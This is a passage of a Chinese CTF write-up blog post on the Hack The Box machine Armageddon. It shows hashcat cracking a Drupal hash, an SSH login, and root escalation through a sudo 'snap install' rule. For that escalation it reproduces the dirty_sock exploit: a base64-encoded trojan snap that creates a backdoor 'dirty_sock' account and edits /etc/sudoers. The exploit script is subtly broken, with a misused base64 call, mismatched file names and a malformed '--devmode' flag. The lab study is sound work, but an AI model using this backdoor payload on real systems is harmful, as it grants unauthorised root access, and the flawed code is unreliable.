+<p>我们得到用户brucetherealadmin的hash值<br>hashcat -m 7900 -a 0 hash.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt<br><img src="https://img-blog.csdnimg.cn/4f479709b1e14411979a44374ed6c7c8.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>发生了一波意外，百度报错发现是因为kali的配置不够吧。于是我就在windows下载和hashcat，在windows运行命令</p>
+<p>-m 7900是指类型，在hashcat中Drupal7是7900<br><img src="https://img-blog.csdnimg.cn/de8f273efc3049d2adcdd676d2660270.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p>
+<p>hashcat.exe破解出hash是booboo。<br>补充一下知识，crunch可以创建自定义的破解字典，可以和hashcat，join the ripper，aircrack-ng等工具一起使用。而上面文章使用的cewl是利用爬虫生成的目录字典。<br>接下来我们使用ssh通道登陆<br>ssh <a href="mailto:&#98;&#x72;&#x75;&#x63;&#x65;&#116;&#x68;&#x65;&#x72;&#x65;&#97;&#108;&#97;&#100;&#109;&#105;&#x6e;&#x40;&#x31;&#x30;&#x2e;&#x31;&#x30;&#x2e;&#49;&#48;&#x2e;&#x32;&#x33;&#51;">&#98;&#x72;&#x75;&#x63;&#x65;&#116;&#x68;&#x65;&#x72;&#x65;&#97;&#108;&#97;&#100;&#109;&#105;&#x6e;&#x40;&#x31;&#x30;&#x2e;&#x31;&#x30;&#x2e;&#49;&#48;&#x2e;&#x32;&#x33;&#51;</a><br><img src="https://img-blog.csdnimg.cn/2ebb27e34af14a0baae8e02935885c85.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>sudo -l 检查我们可以运行的命令是提升的用户</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">[brucetherealadmin@armageddon ~]$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> brucetherealadmin on armageddon:<br>    !visiblepw, always_set_home, match_group_by_gid,<br>    always_query_group_plugin, env_reset, env_keep=<span class="hljs-string">&quot;COLORS DISPLAY HOSTNAME</span><br><span class="hljs-string">    HISTSIZE KDEDIR LS_COLORS&quot;</span>, env_keep+=<span class="hljs-string">&quot;MAIL PS1 PS2 QTDIR USERNAME LANG</span><br><span class="hljs-string">    LC_ADDRESS LC_CTYPE&quot;</span>, env_keep+=<span class="hljs-string">&quot;LC_COLLATE LC_IDENTIFICATION</span><br><span class="hljs-string">    LC_MEASUREMENT LC_MESSAGES&quot;</span>, env_keep+=<span class="hljs-string">&quot;LC_MONETARY LC_NAME LC_NUMERIC</span><br><span class="hljs-string">    LC_PAPER LC_TELEPHONE&quot;</span>, env_keep+=<span class="hljs-string">&quot;LC_TIME LC_ALL LANGUAGE LINGUAS</span><br><span class="hljs-string">    _XKB_CHARSET XAUTHORITY&quot;</span>, secure_path=/sbin\:/<span class="hljs-built_in">bin</span>\:/usr/sbin\:/usr/<span class="hljs-built_in">bin</span><br><br>User brucetherealadmin may run the following commands on armageddon:<br>    (root) NOPASSWD: /usr/<span class="hljs-built_in">bin</span>/snap install *<br><br></code></pre></td></tr></table></figure>
+<p>我们可以用没有密码的root运行&#x2F;usr&#x2F;bin&#x2F;snap install *<br><img src="https://img-blog.csdnimg.cn/9613f36917cc4c5590a6ae176f90f473.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>我们查找snap的漏洞<br>searchexploit -w snap<br><img src="https://img-blog.csdnimg.cn/747f66b006fc42ac9bf223417779a4c4.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>发现dirty_sock的漏洞允许特权升级。我们在这里发现漏洞的利用姿势<br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/46362">https://www.exploit-db.com/exploits/46362</a><br>有一个“TROJAN_SNAP”的变量，上面有一个注释，告诉我们它是一个编码的快照文件，它创建了一个后门帐户。我们创建一个 python 脚本来解码它并创建 snap 文件。<br>从exploitdb中获取exploit代码，并使用它创建一个后门快照包</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br> <br>encoded = (<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/</span><br><span class="hljs-string">/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh</span><br><span class="hljs-string">ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5</span><br><span class="hljs-string">TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo</span><br><span class="hljs-string">T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl</span><br><span class="hljs-string">Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt</span><br><span class="hljs-string">ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv</span><br><span class="hljs-string">ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n</span><br><span class="hljs-string">L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt</span><br><span class="hljs-string">b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe</span><br><span class="hljs-string">rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj</span><br><span class="hljs-string">rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA</span><br><span class="hljs-string">AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2</span><br><span class="hljs-string">XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5</span><br><span class="hljs-string">RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA</span><br><span class="hljs-string">AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&#x27;&#x27;&#x27;</span><br>               + <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">4256</span> + <span class="hljs-string">&#x27;==&#x27;</span>)<br> <br>decoded = base64.decode(encoded)<br> <br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./deadly.snap&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<br>f.write(decoded)<br>f.close()<br></code></pre></td></tr></table></figure>
+<p>vim exploit.py<br>python运行exploit.py<br>python exploit.py<br>创建一个snap文件<br>sudo &#x2F;usr&#x2F;bin&#x2F;snap install –devmode exp.snap<br><img src="https://img-blog.csdnimg.cn/2698487ae2dc47e1b95f29dcff9f2615.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>现在就提权到了root</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB-Armageddon</div>
+      <div>http://example.com/2023/04/20/HTB- Armageddon/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>H0ne</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/04/20/HTB-AdmirerToo/" title="HTB-AdmirerToo">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB-AdmirerToo</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/20/Flask-session%E7%94%A8%E6%B3%95/" title="Flask-session用法">
+                        <span class="hidden-mobile">Flask-session用法</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/snowflake.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
